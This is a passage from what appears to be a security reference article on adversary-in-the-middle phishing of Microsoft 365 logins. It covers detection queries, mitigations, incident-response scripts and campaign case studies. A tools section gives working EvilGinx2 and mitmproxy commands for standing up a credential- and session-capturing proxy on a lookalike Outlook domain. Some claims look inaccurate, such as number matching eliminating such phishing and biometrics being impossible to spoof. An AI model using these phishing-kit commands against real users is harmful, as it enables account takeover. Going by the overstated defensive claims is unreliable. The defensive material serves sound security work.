    "refresh_token": "0.ARQAv4J8G_xL4...",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "https://graph.microsoft.com/.default offline_access"
}
```

**What This Enables:**

- Full access to victim's emails, files, Teams, calendar, contacts
- Refresh token valid for 90 days (can be silently refreshed)
- No passwords or credentials ever exposed
- No MFA ever bypassed (MFA was successfully completed)
- Yet full account compromise achieved

---

## 5. TOOLS & COMMANDS REFERENCE

### [EvilGinx2 - Reverse Proxy AiTM Phishing Kit](https://github.com/kgretzky/evilginx2)

**Version:** 2.4.11 (latest stable)  
**Language:** Go  
**Supported Platforms:** Linux, macOS  

**Installation:**

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
./evilginx2 -phishlet outlook -domain login-outlook.net
```

**Usage:**

```bash
evilginx2 -debug -o /tmp/evilginx2.log
# In console:
phishlet enable outlook
letsencrypt domain login-outlook.net
start
creds  # Display captured credentials
```

**References:**

- [EvilGinx2 GitHub](https://github.com/kgretzky/evilginx2)
- [Evilginx2 Documentation](https://help.evilginx.com)

### [mitmproxy - Man-in-the-Middle Proxy](https://mitmproxy.org/)

**Version:** 9.0+  
**Language:** Python  

**Installation & Usage:**

```bash
pip install mitmproxy
mitmproxy -H -p 8080 --mode reverse:https://login.microsoftonline.com --modify-body "/login/^/spoofed-login/"
```

### [Evilginx3 - Enhanced Version](https://github.com/kgretzky/evilginx3)

**Features:**

- Improved evasion techniques
- Better credential harvesting
- Enhanced logging
- Go 1.18+ required

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Impossible Travel - Same User from Distant Locations

**KQL Query:**

```kusto
SignInLogs
| where TimeGenerated > ago(24h)
| project TimeGenerated, UserPrincipalName, IPAddress, Location, DeviceId
| summarize 
    Locations = make_set(Location),
    IPs = make_set(IPAddress),
    FirstSignIn = min(TimeGenerated),
    LastSignIn = max(TimeGenerated)
    by UserPrincipalName
| where array_length(Locations) > 1
| extend TimeDiff = LastSignIn - FirstSignIn
| where TimeDiff < 1h  // Same user from different countries in less than 1 hour
| project UserPrincipalName, Locations, IPs, TimeDiff
```

**What This Detects:**

- User signs in from US (California) at 2pm
- Same user signs in from Asia (Indonesia) at 2:30pm (30 minutes later)
- Geographically impossible without private jet

### Query 2: Session Cookie Theft Detection

**KQL Query:**

```kusto
SignInLogs
| where TimeGenerated > ago(24h)
| where TokenIssuerType == "AzureAD"
| summarize 
    SignInCount = count(),
    UniqueIPs = dcount(IPAddress),
    UniqueBrowsers = dcount(UserAgent),
    FirstSignIn = min(TimeGenerated),
    LastSignIn = max(TimeGenerated),
    Locations = make_set(Location)
    by SessionId, UserPrincipalName
| where SignInCount > 1 and UniqueIPs > 1 and (LastSignIn - FirstSignIn) < 1h
| project UserPrincipalName, SessionId, SignInCount, UniqueIPs, Locations
```

### Query 3: Unusual Mailbox Access Pattern Post-Authentication

**KQL Query:**

```kusto
let suspiciousSignIns = SignInLogs
| where Status == "Success"
| where IPAddress has_any ("proxy", "vpn", "anonymizer") or Location !in ("Company Office Locations")
| project SignInTime = TimeGenerated, UserPrincipalName, IPAddress;

CloudAppEvents
| where ActionType in ("MailItemsAccessed", "MailboxExported", "Set-InboxRule")
| where TimeGenerated > ago(24h)
| join kind=inner suspiciousSignIns on UserPrincipalName
| where TimeGenerated - SignInTime < 5m
| project TimeGenerated, UserPrincipalName, ActionType, ObjectModified, IPAddress
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation) — Limited Relevance**

- **Trigger:** If victim's browser is compromised and sensitive processes execute.
- **Filter:** CommandLine contains "evilginx2", "mitmproxy", "oauth", "phishing".
- **Applies To:** Windows 10+

**Event ID: 1200 (HTTPS Certificate Install)**

- **Trigger:** Attacker installs SSL certificate for cloned domain.
- **Filter:** CertificateSubjectName contains "outlook", "login", "microsoft".
- **Applies To:** Windows Server 2016+

**Note:** OAuth consent screen cloning is primarily a browser-based attack. Windows event logs provide minimal visibility. Focus on cloud logs (Entra ID, Sentinel).

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Unusual Email Access and Forwarding Rule Creation

**PowerShell:**

```powershell
# Search for suspicious email access patterns
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) -Operations "MailItemsAccessed" | `
  Where-Object { $_.AuditData -like "*raw=true*" } | `
  Select-Object UserIds, CreatedDate, AuditData | `
  Export-Csv -Path "C:\Audit\unusual_mail_access.csv"

# Search for inbox rule creation (persistence tactic)
Search-UnifiedAuditLog -Operations "New-InboxRule", "Set-InboxRule" | `
  Where-Object { $_.CreatedDate -gt (Get-Date).AddHours(-24) } | `
  Select-Object UserIds, Operations, CreatedDate | `
  ForEach-Object {
    Write-Host "[!] Inbox rule created/modified by $($_.UserIds) at $($_.CreatedDate)"
  }
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enforce Phishing-Resistant Multi-Factor Authentication**

Microsoft Authenticator (number matching), FIDO2 security keys, or Windows Hello are resistant to AiTM attacks because they require user approval or biometric verification on a separate device.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Authentication methods**
2. Enable: **Microsoft Authenticator** (with "Approval requests" or "Number matching" mode)
3. Enable: **FIDO2 security keys** (hardware tokens like Yubikey)
4. Enable: **Windows Hello for Business**
5. Disable or restrict: SMS/Voice-based MFA (susceptible to interception)
6. Disable: App-based TOTP if possible (mobile malware can intercept codes)

**PowerShell:**

```powershell
# Enforce number matching in Microsoft Authenticator
$params = @{
    DisplayName = "Microsoft Authenticator with Number Matching"
    State = "enabled"
    IncludeTargets = @{
        Id = "all_users"
        InclusionType = "include"
    }
    FeatureSettings = @{
        IsReportingRequired = $true
        NumberMatchingRequired = "enable"
    }
}

New-MgAuthenticationMethodPolicy -BodyParameter $params
```

**Why This Works:**

- **Number Matching:** User must approve MFA on their physical device (phone) by matching a number shown on login screen. Attacker's proxy cannot replicate this because it's a separate device interaction.
- **FIDO2:** Cryptographic authentication bound to specific domain. Phishing page cannot trigger FIDO2 approval because it's on attacker's domain, not Microsoft's.
- **Windows Hello:** Biometric authentication impossible to spoof.

**Impact:**

- High user friction (requires hardware key or mobile device)
- Eliminates AiTM phishing as viable attack vector
- Recommended for high-risk users (executives, admins, finance)

---

**2. Implement Risk-Based Conditional Access Policies**

Detect and block suspicious sign-ins based on impossible travel, anomalous locations, and device compliance.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Impossible Travel`
4. **Conditions:**
   - **Sign-in risk:** High
   - **Device state:** Any
5. **Access controls:**
   - **Grant:** Require device to be marked as compliant AND Require MFA
6. Click **Create**

**Manual Steps (PowerShell):**

```powershell
# Create policy blocking high-risk sign-ins
$params = @{
    DisplayName = "Block High-Risk Sign-Ins from AiTM"
    State = "enabled"
    Conditions = @{
        SignInRiskLevels = @("high")
        Users = @{
            IncludeUsers = @("all")
        }
    }
    GrantControls = @{
        Operator = "AND"
        BuiltInControls = @("mfa", "compliantDevice")
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $params
```

---

**3. Monitor and Alert on Suspicious Sign-In Patterns**

Enable real-time alerting for impossible travel, rare locations, and anomalous user behavior.

**Manual Steps (Entra ID):**

1. Navigate to **Entra ID** → **Security** → **Identity Protection** → **Sign-in risk policy**
2. Configure:
   - **Risk level:** Low and above
   - **Access controls:** Require MFA
   - **Enable for all users:** Yes
3. Save

---

### Priority 2: HIGH

**4. Require Device Compliance for Email Access**

Limit email access to managed, compliant devices to prevent session cookie abuse on unmanaged machines.

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. **Name:** `Require Compliant Device for Exchange`
3. **Cloud apps:** Exchange Online (Office 365)
4. **Access controls:** Require device to be marked as compliant
5. Save

---

**5. Enable Continuous Access Evaluation (CAE)**

Revoke tokens in real-time if suspicious activity is detected (e.g., user signs in from impossible location, MFA method changed).

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Look for **Continuous Access Evaluation** setting
3. Enable CAE for all policies
4. Configure revocation triggers (login attempt after revocation, MFA method change, etc.)

---

**6. Configure Advanced Audit Logging**

Ensure all sign-in attempts, credential changes, and email access are logged and monitored.

**Manual Steps (PowerShell):**

```powershell
# Enable comprehensive Entra ID logging
Connect-MgGraph -Scopes "AuditLog.ReadWrite.All"

# Ensure all audit events are retained for 90+ days
# This is configured via Microsoft Purview Compliance Portal
```

---

**Validation Command (Verify Mitigations):**

```powershell
# Check authentication method policies
Get-MgAuthenticationMethodPolicy | Select-Object DisplayName, State

# Verify Conditional Access policies are blocking high-risk sign-ins
Get-MgIdentityConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Risk*" } | Select-Object DisplayName, State

# Check if phishing-resistant auth is enforced
Get-MgAuthenticationMethodPolicy -AuthenticationMethodId fido2 | Select-Object State
```

**Expected Output (If Secure):**

```
DisplayName: Microsoft Authenticator
State: enabled
NumberMatchingRequired: enable

DisplayName: Block High-Risk Sign-Ins
State: enabled

DisplayName: FIDO2 Security Keys
State: enabled
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network/Browser IOCs:**

- Sign-in from IP address registered to cloud hosting provider (AWS, Azure, DigitalOcean, Vultr, Linode) not matching user's normal location.
- Multiple sign-ins from different IP addresses within minutes (session cookie replay).
- Sign-in from Tor exit node or VPN service.
- Session ID reused across geographic locations within impossible travel time.
- Browser user agent differs between initial sign-in and subsequent Graph API calls (indicates session hijacking).

**Email/Account IOCs:**

- Inbox rule created that moves emails to Archive and marks as read (persistence + evasion).
- MFA method added without MFA challenge (attacker added OTP method to compromise account).
- Large bulk email downloads via Outlook Web Access or Exchange Web Services.
- Email forwarding rule created to external domain.
- Suspicious "Recent logins" in account security settings showing unfamiliar locations/devices.

**Phishing/Attack IOCs:**

- Emails with links to `login-outlook.net`, `outlookmail-signin.com`, or similar lookalike domains.
- Phishing emails from trusted vendors (vendor account compromised).
- URLs pointing to legitimate domains with malicious subpath (e.g., `canva.com/fax-preview`).
- Emails claiming "Verification Required", "Account Locked", "MFA Update Needed" with urgency language.

### Forensic Artifacts

**Cloud Logs:**

- **Sign-In Logs:** Suspicious entries with impossible travel, rare locations, or VPN/Tor IPs.
- **Audit Logs:** "New-InboxRule", "Set-InboxRule" created by attacker post-compromise.
- **Graph Activity:** Bulk downloads of email via `/me/messages?$top=1000`, file enumeration via `/me/drive/root/children`.
- **Unified Audit Log (M365):** "MailItemsAccessed", "New-InboxRule", "Add-MailboxPermission".

**Browser/Endpoint:**

- Browser history showing visits to lookalike domains (`login-outlook.net`).
- Cookie files containing session tokens for `login.microsoftonline.com` from suspicious times.
- SSL certificate pinning bypass evidence (EvilGinx2 generates new certificates for cloned pages).

### Response Procedures

**Immediate Actions (0-30 minutes):**

1. **Revoke All Session Cookies:**

```powershell
# Revoke all active sessions for compromised user
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'alice@company.com'").Id

# This will sign the user out of all devices/apps immediately
```

2. **Reset Password:**

```powershell
# Force password reset on next sign-in
Update-MgUser -UserId "alice@company.com" -ForceChangePasswordNextSignIn $true

# Provide temp password via secure channel
$tempPassword = -join ((33..126) | Get-Random -Count 20 | ForEach-Object {[char]$_})
```

3. **Revoke MFA Methods Modified by Attacker:**

```powershell
# Remove MFA methods added by attacker
Get-MgUserAuthenticationMethod -UserId "alice@company.com" | `
  Where-Object { $_.DisplayName -like "*OneWayOTP*" -or $_.DisplayName -like "*SMS*Attacker*" } | `
  Remove-MgUserAuthenticationMethod
```

4. **Remove Suspicious Inbox Rules:**

```powershell
# List and remove inbox rules (persistence mechanism)
Get-InboxRule -Mailbox "alice@company.com" | `
  Where-Object { $_.Actions -contains "Archive" -or $_.Actions -contains "Delete" } | `
  Remove-InboxRule -Confirm:$false
```

5. **Block Compromised Session:**

```powershell
# Disable the user account temporarily (most aggressive option)
Update-MgUser -UserId "alice@company.com" -AccountEnabled $false

# Re-enable only after password reset + MFA reconfiguration
Update-MgUser -UserId "alice@company.com" -AccountEnabled $true
```

**Containment (30 minutes - 2 hours):**

6. **Investigate Exfiltrated Data:**

```powershell
# Determine what data was accessed
$exfilAudit = Search-UnifiedAuditLog -UserIds "alice@company.com" `
  -Operations "MailItemsAccessed", "Get user mail items" `
  -StartDate (Get-Date).AddDays(-7) | `
  Where-Object { $_.CreatedDate -gt (Get-Date).AddHours(-24) }

$exfilAudit | ForEach-Object {
  $auditData = ConvertFrom-Json $_.AuditData
  Write-Host "[!] Accessed: $($auditData.MailboxClientSize) bytes from mailbox at $($_.CreatedDate)"
}
```

7. **Check for Lateral Movement:**

```powershell
# Search for phishing emails sent from compromised account
Get-TransportRule | Where-Object { $_.SourceDescription -eq "alice@company.com" }

# Review mailbox forwarding rules
Get-Mailbox "alice@company.com" | Select-Object ForwardingAddress, ForwardingSmtpAddress

# Search for account delegation
Get-MailboxPermission -Identity "alice@company.com" | Where-Object { $_.IsInherited -eq $false }
```

8. **Determine Compromise Timeline:**

```powershell
# Find first suspicious sign-in (AiTM origin)
$suspiciousSignIn = Get-MgAuditLogSignIn -Filter "userPrincipalName eq 'alice@company.com'" | `
  Sort-Object CreatedDateTime | `
  Select-Object -First 1 CreatedDateTime, IPAddress, Location, UserAgent

Write-Host "[!] First suspicious sign-in: $($suspiciousSignIn.CreatedDateTime) from $($suspiciousSignIn.IPAddress)"
```

**Recovery (2-24 hours):**

9. **Threat Hunt for Similar Compromises:**

```powershell
# Find all users with impossible travel patterns
$allSignIns = Get-MgAuditLogSignIn -Filter "createdDateTime gt 2025-12-14" | `
  Group-Object UserPrincipalName

$allSignIns | ForEach-Object {
  $locations = $_.Group | Select-Object -ExpandProperty Location | Sort-Object -Unique
  $times = $_.Group | Select-Object -ExpandProperty CreatedDateTime | Sort-Object
  
  if ($locations.Count -gt 1 -and ($times[-1] - $times[0]).TotalHours -lt 1) {
    Write-Host "[!] POTENTIAL COMPROMISE: $($_.Name)"
    Write-Host "    Locations: $($locations -join ', ')"
    Write-Host "    Time span: $(($times[-1] - $times[0]).TotalMinutes) minutes"
  }
}
```

10. **Patch Email Rules and Forwarding:**

```powershell
# Disable ALL forwarding for compromised user (temporary)
Set-Mailbox "alice@company.com" -ForwardingAddress $null

# Remove all inbox rules
Get-InboxRule -Mailbox "alice@company.com" | Remove-InboxRule -Confirm:$false

# Re-enable legitimate rules only after investigation
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[IA-PHISH-003]** | **OAuth Consent Screen Cloning — attacker's proxy intercepts authentication and captures session tokens** |
| **2** | **Credential Access** | T1110 (Brute Force) | Attacker searches compromised emails for passwords, credentials, admin details |
| **3** | **Persistence** | T1098 (Account Manipulation) | Attacker adds new MFA method or modifies account settings to maintain access |
| **4** | **Defense Evasion** | T1562.008 (Disable Cloud Logs) | Attacker creates inbox rules to archive/delete evidence of compromise |
| **5** | **Lateral Movement** | IA-PHISH-005 (Internal Phishing) | Attacker uses compromised mailbox to send AiTM phishing to organizational contacts |
| **6** | **Impact** | T1537 (Data Transfer) | Attacker exfiltrates emails, files, Teams data; performs BEC campaigns |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Large-Scale AiTM Campaign (September 2021 - Present)

**Attribution:** Unknown cybercriminals (financially motivated)

**Target:** 10,000+ organizations globally; Office 365 users

**Timeline:** Ongoing since September 2021; still active as of December 2025

**Methodology:**

1. Attackers deployed EvilGinx2 instances on compromised/attacker-controlled servers
2. Proxied login.microsoftonline.com and outlook.office.com
3. Sent bulk phishing emails with links to AiTM proxies
4. Captured usernames, passwords, and session cookies
5. Replayed session cookies to access mailboxes
6. Exfiltrated sensitive data and initiated BEC campaigns targeting organizational contacts

**Detected By:**

- Microsoft Threat Intelligence
- Proofpoint
- Volexity
- Multiple SIEM vendors

**Impact:**

- 10,000+ organizations targeted
- Thousands of compromised mailboxes
- Millions of follow-on phishing emails sent
- Unknown volume of financial fraud via BEC

**References:**

- [Microsoft - AiTM Phishing Campaigns](https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-poi)

---

### Example 2: Storm-1167 Multi-Stage AiTM Campaign (2023)

**Attribution:** Storm-1167 (cybercriminal group; AiTM phishing kit operator)

**Target:** Banking and financial services organizations

**Timeline:** Discovered June 2023; ongoing

**Attack Methodology:**

1. **Stage 1:** Phishing email from trusted vendor (spoofed) with link to compromised Canva document
2. **Stage 2:** Link redirected to Tencent Cloud-hosted phishing page that spoofed Microsoft login
3. **Stage 3:** AiTM attack captured password, MFA code, and session cookie
4. **Stage 4:** Attacker replayed session cookie to impersonate user
5. **Stage 5:** Attacker modified MFA method (added OneWayOTP with attacker's phone number)
6. **Stage 6:** Attacker created inbox rule to archive all incoming emails and mark as read
7. **Stage 7:** Attacker sent 16,000+ phishing emails to victim's contacts
8. **Stage 8:** BEC campaign targeting organizational partners

**Detection & Impact:**

- Microsoft Defender Experts detected and disrupted the attack
- Affected 16,000+ emails sent to targets
- Estimated millions in attempted fraud

**References:**

- [Microsoft Defender Experts - Multi-Stage AiTM Campaign](https://www.microsoft.com/en-us/security/blog/2023/06/08/detecting-and-mitigating-a-multi-stage-aitm-phishing-and-bec-campaign/)

---

### Example 3: ConsentFix Campaign (December 2025)

**Attribution:** Unknown threat actors; possibly same group behind ClickFix

**Target:** Enterprise users with Microsoft 365 accounts; initial targets included users searching for Azure CLI information

**Timeline:** Detected December 11, 2025; ongoing

**Attack Methodology:**

1. **Delivery:** Google Search ads or watering hole (legitimate website compromise)
2. **Lure:** Fake Cloudflare Turnstile CAPTCHA on compromised website
3. **Email Check:** Page only proceeds if entered email belongs to targeted organization
4. **Azure CLI Auth:** Opens legitimate Microsoft login in new tab
5. **User Auth:** User authenticates normally to real Microsoft (no credentials stolen at this stage)
6. **Authorization Code:** Microsoft redirects to localhost with authorization code in URL
7. **Copy/Paste Social Engineering:** Page prompts user to copy localhost URL from address bar and paste it back
8. **Code Capture:** Attacker captures authorization code from pasted URL
9. **Token Exchange:** Attacker exchanges authorization code for OAuth tokens
10. **Account Compromise:** Attacker gains full access to victim's Microsoft account without password or MFA compromise

**Detection Methods:**

- Monitoring logins to "Microsoft Azure CLI" app (Application ID: 04b07795-8ddb-461a-bbee-02f9e1bf7b46)
- Detecting non-interactive logins from unusual IPs after initial interactive login
- Identifying authorization code flow followed by Graph API access

**Impact:**

- Unknown number of compromised accounts
- Targets primarily IT professionals and developers
- No password compromise; no MFA bypass (yet account fully compromised)
- **Defeats phishing-resistant authentication** like passkeys (no credentials exposed)

**References:**

- [Push Security - ConsentFix Blog](https://pushsecurity.com/blog/consentfix)
- [Arctic Wolf - ConsentFix Analysis](https://arcticwolf.com/resources/blog/new-attack-technique-consentfix-hijacks-oauth-consent-grants/)

---
